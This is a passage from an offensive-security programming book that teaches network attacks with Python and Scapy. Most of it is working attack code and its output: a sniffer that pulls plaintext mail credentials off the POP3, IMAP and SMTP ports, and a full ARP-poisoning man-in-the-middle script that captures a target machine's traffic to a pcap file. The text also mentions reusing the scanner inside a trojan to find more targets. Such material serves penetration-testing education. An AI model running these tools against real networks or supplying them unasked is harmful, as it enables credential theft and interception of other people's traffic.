s = socket.socket()
s.connect((ip, 25))
# send mail packets
This will greatly simplify your programming life when dealing with entire
networks at a time, and it is ideally suited for our host discovery tool . After it’s
installed, you are ready to proceed .
c:\Python27\python.exe scanner.py
Host Up: 192.168.0.1
Host Up: 192.168.0.190
Host Up: 192.168.0.192
Host Up: 192.168.0.195
For a quick scan like the one I performed, it only took a few seconds to
get the results back. By cross-referencing these IP addresses with the DHCP
table in my home router, I was able to verify that the results were accurate.
You can easily expand what you’ve learned in this chapter to decode TCP
and UDP packets, and build additional tooling around it. This scanner is
also useful for the trojan framework we will begin building in Chapter 7.
This would allow a deployed trojan to scan the local network looking for
additional targets. Now that we have the basics down of how networks work
on a high and low level, let’s explore a very mature Python library called
Scapy.
46 Chapter 3
4
owning tHe n e t work
witH sca Py
Occasionally, you run into such a well thought-out,
amazing Python library that dedicating a whole chap-
ter to it can’t do it justice. Philippe Biondi has cre-
ated such a library in the packet manipulation library
Scapy. You just might finish this chapter and realize
that I made you do a lot of work in the previous two
chapters that you could have done with just one or two lines of Scapy.
Scapy is powerful and flexible, and the possibilities are almost infinite.
We’ll get a taste of things by sniffing to steal plain text email credentials
and then ARP poisoning a target machine on our network so that we can
sniff their traffic. We’ll wrap things up by demonstrating how Scapy’s
PCAP processing can be extended to carve out images from HTTP traf-
fic and then perform facial detection on them to determine if there are
humans present in the images.
I recommend that you use Scapy under a Linux system, as it was
designed to work with Linux in mind. The newest version of Scapy does
support Windows,1 but for the purpose of this chapter I will assume you are
using your Kali VM that has a fully functioning Scapy installation. If you
don’t have Scapy, head on over to http://www.secdev.org/projects/scapy/ to
install it.
stealing email credentials
You have already spent some time getting into the nuts and bolts of sniff-
ing in Python. So let’s get to know Scapy’s interface for sniffing packets and
dissecting their contents. We are going to build a very simple sniffer to cap-
ture SMTP, POP3, and IMAP credentials. Later, by coupling our sniffer
with our Address Resolution Protocol (ARP) poisoning man-in-the-middle
(MITM) attack, we can easily steal credentials from other machines on the
network. This technique can of course be applied to any protocol or to sim-
ply suck in all traffic and store it in a PCAP file for analysis, which we will
also demonstrate.
To get a feel for Scapy, let’s start by building a skeleton sniffer that sim-
ply dissects and dumps the packets out. The aptly named sniff function
looks like the following:
sniff(filter="",iface="any",prn=function,count=N)
The filter parameter allows us to specify a BPF (Wireshark-style) filter
to the packets that Scapy sniffs, which can be left blank to sniff all packets.
For example, to sniff all HTTP packets you would use a BPF filter of tcp
port 80. The iface parameter tells the sniffer which network interface to
sniff on; if left blank, Scapy will sniff on all interfaces. The prn parameter
specifies a callback function to be called for every packet that matches
the filter, and the callback function receives the packet object as its single
parameter. The count parameter specifies how many packets you want to
sniff; if left blank, Scapy will sniff indefinitely.
Let’s start by creating a simple sniffer that sniffs a packet and dumps its
contents. We’ll then expand it to only sniff email-related commands. Crack
open mail_sniffer.py and jam out the following code:
from scapy.all import *
# our packet callback
u def packet_callback(packet):
print packet.show()
# fire up our sniffer
v sniff(prn=packet_callback,count=1)
1. http://www.secdev.org/projects/scapy/doc/installation.html#windows
48 Chapter 4
We start by defining our callback function that will receive each sniffed
packet u and then simply tell Scapy to start sniffing v on all interfaces with
no filtering. Now let’s run the script and you should see output similar to
what you see below.
$ python2.7 mail_sniffer.py
WARNING: No route found for IPv6 destination :: (no default route?)
###[ Ethernet ]###
dst = 10:40:f3:ab:71:02
src = 00:18:e7:ff:5c:f8
type = 0x800
###[ IP ]###
version = 4L
ihl = 5L
tos = 0x0
len = 52
id = 35232
flags = DF
frag = 0L
ttl = 51
proto = tcp
chksum = 0x4a51
src = 195.91.239.8
dst = 192.168.0.198
\options \
###[ TCP ]###
sport = etlservicemgr
dport = 54000
seq = 4154787032
ack = 2619128538
dataofs = 8L
reserved = 0L
flags = A
window = 330
chksum = 0x80a2
urgptr = 0
options = [('NOP', None), ('NOP', None), ('Timestamp', (1960913461,¬
764897985))]
None
How incredibly easy was that! We can see that when the first packet was
received on the network, our callback function used the built-in function
packet.show() to display the packet contents and to dissect some of the proto-
col information. Using show() is a great way to debug scripts as you are going
along to make sure you are capturing the output you want.
Now that we have our basic sniffer running, let’s apply a filter and add
some logic to our callback function to peel out email-related authentication
strings.
Owning the Network with Scapy 49
from scapy.all import *
# our packet callback
def packet_callback(packet):
u if packet[TCP].payload:
mail_packet = str(packet[TCP].payload)
v if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
print "[*] Server: %s" % packet[IP].dst
w print "[*] %s" % packet[TCP].payload
# fire up our sniffer
x sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_¬
callback,store=0)
Pretty straightforward stuff here. We changed our sniff function
to add a filter that only includes traffic destined for the common mail
ports 110 (POP3), 143 (IMAP), and SMTP (25) x. We also used a new
parameter called store, which when set to 0 ensures that Scapy isn’t keep-
ing the packets in memory. It’s a good idea to use this parameter if you
intend to leave a long-term sniffer running because then you won’t be
consuming vast amounts of RAM. When our callback function is called,
we check to make sure it has a data payload u and whether the payload
contains the typical USER or PASS mail commands v. If we detect an
authentication string, we print out the server we are sending it to and the
actual data bytes of the packet w.
Kicking the Tires
Here is some example output from a dummy email account I attempted to
connect my mail client to:
[*] Server: 25.57.168.12
[*] USER jms
[*] Server: 25.57.168.12
[*] PASS justin
[*] Server: 25.57.168.12
[*] USER jms
[*] Server: 25.57.168.12
[*] PASS test
You can see that my mail client is attempting to log in to the server at
25.57.168.12 and sending the plain text credentials over the wire. This is a
really simple example of how you can take a Scapy sniffing script and turn it
into a useful tool during penetration tests.
Sniffing your own traffic might be fun, but it’s always better to sniff
with a friend, so let’s take a look at how you can perform an ARP poisoning
attack to sniff the traffic of a target machine on the same network.
50 Chapter 4
aRP cache Poisoning with scapy
ARP poisoning is one of the oldest yet most effective tricks in a hacker’s
toolkit. Quite simply, we will convince a target machine that we have
become its gateway, and we will also convince the gateway that in order
to reach the target machine, all traffic has to go through us. Every com-
puter on a network maintains an ARP cache that stores the most recent
MAC addresses that match to IP addresses on the local network, and we
are going to poison this cache with entries that we control to achieve this
attack. Because the Address Resolution Protocol and ARP poisoning in
general is covered in numerous other materials, I’ll leave it to you to do
any necessary research to understand how this attack works at a lower
level.
Now that we know what we need to do, let’s put it into practice. When
I tested this, I attacked a real Windows machine and used my Kali VM as
my attacking machine. I have also tested this code against various mobile
devices connected to a wireless access point and it worked great. The first
thing we’ll do is check the ARP cache on the target Windows machine so we
can see our attack in action later on. Examine the following to see how to
inspect the ARP cache on your Windows VM.
C:\Users\Clare> ipconfig
Windows IP Configuration
Wireless LAN adapter Wireless Network Connection:
Connection-specific DNS Suffix . : gateway.pace.com
Link-local IPv6 Address . . . . . : fe80::34a0:48cd:579:a3d9%11
IPv4 Address. . . . . . . . . . . : 172.16.1.71
Subnet Mask . . . . . . . . . . . : 255.255.255.0
u Default Gateway . . . . . . . . . : 172.16.1.254
C:\Users\Clare> arp -a
Interface: 172.16.1.71 --- 0xb
Internet Address Physical Address Type
v 172.16.1.254 3c-ea-4f-2b-41-f9 dynamic
172.16.1.255 ff-ff-ff-ff-ff-ff static
224.0.0.22 01-00-5e-00-00-16 static
224.0.0.251 01-00-5e-00-00-fb static
224.0.0.252 01-00-5e-00-00-fc static
255.255.255.255 ff-ff-ff-ff-ff-ff static
So now we can see that the gateway IP address u is at 172.16.1.254 and
its associated ARP cache entry v has a MAC address of 3c-ea-4f-2b-41-f9.
We will take note of this because we can view the ARP cache while the
attack is ongoing and see that we have changed the gateway’s registered
Owning the Network with Scapy 51
MAC address. Now that we know the gateway and our target IP address,
let’s begin coding our ARP poisoning script. Open a new Python file, call
it arper.py, and enter the following code:
from scapy.all import *
import os
import sys
import threading
import signal
interface = "en1"
target_ip = "172.16.1.71"
gateway_ip = "172.16.1.254"
packet_count = 1000
# set our interface
conf.iface = interface
# turn off output
conf.verb = 0
print "[*] Setting up %s" % interface
u gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
print "[!!!] Failed to get gateway MAC. Exiting."
sys.exit(0)
else:
print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)
v target_mac = get_mac(target_ip)
if target_mac is None:
print "[!!!] Failed to get target MAC. Exiting."
sys.exit(0)
else:
print "[*] Target %s is at %s" % (target_ip,target_mac)
# start poison thread
w poison_thread = threading.Thread(target = poison_target, args = ¬
(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()
try:
print "[*] Starting sniffer for %d packets" % packet_count
bpf_filter = "ip host %s" % target_ip
x packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
52 Chapter 4
# write out the captured packets
y wrpcap('arper.pcap',packets)
# restore the network
 restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
# restore the network
restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
sys.exit(0)
This is the main setup portion of our attack. We start by resolving the
gateway u and target IP v address’s corresponding MAC addresses using
a function called get_mac that we’ll plumb in shortly. After we have accom-
plished that, we spin up a second thread to begin the actual ARP poison-
ing attack w. In our main thread, we start up a sniffer x that will capture
a preset amount of packets using a BPF filter to only capture traffic for
our target IP address. When all of the packets have been captured, we
write them out y to a PCAP file so that we can open them in Wireshark
or use our upcoming image carving script against them. When the attack
is finished, we call our restore_target function , which is responsible for
putting the network back to the way it was before the ARP poisoning took
place. Let’s add the supporting functions now by punching in the follow-
ing code above our previous code block:
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
# slightly different method using send
print "[*] Restoring target..."
u send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, ¬
hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, ¬
hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
# signals the main thread to exit
v os.kill(os.getpid(), signal.SIGINT)
def get_mac(ip_address):
w responses,unanswered = ¬
srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),¬
timeout=2,retry=10)
# return the MAC address from a response
for s,r in responses:
return r[Ether].src
return None
Owning the Network with Scapy 53
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
x poison_target = ARP()
poison_target.op = 2
poison_target.psrc = gateway_ip
poison_target.pdst = target_ip
poison_target.hwdst= target_mac
y poison_gateway = ARP()
poison_gateway.op = 2
poison_gateway.psrc = target_ip
poison_gateway.pdst = gateway_ip
poison_gateway.hwdst= gateway_mac
print "[*] Beginning the ARP poison. [CTRL-C to stop]"
 while True:
try:
send(poison_target)
send(poison_gateway)
time.sleep(2)
except KeyboardInterrupt:
restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
print "[*] ARP poison attack finished."
return
So this is the meat and potatoes of the actual attack. Our restore_target
function simply sends out the appropriate ARP packets to the network
broadcast address u to reset the ARP caches of the gateway and target
machines. We also send a signal to the main thread v to exit, which will
be useful in case our poisoning thread runs into an issue or you hit ctrl-C
on your keyboard. Our get_mac function is responsible for using the srp
(send and receive packet) function w to emit an ARP request to the speci-
fied IP address in order to resolve the MAC address associated with it. Our
poison_target function builds up ARP requests for poisoning both the target
IP x and the gateway y. By poisoning both the gateway and the target IP
address, we can see traffic flowing in and out of the target. We keep emit-
ting these ARP requests  in a loop to make sure that the respective ARP
cache entries remain poisoned for the duration of our attack.
Let’s take this bad boy for a spin!
Kicking the Tires
Before we begin, we need to first tell our local host machine that we can
forward packets along to both the gateway and the target IP address. If you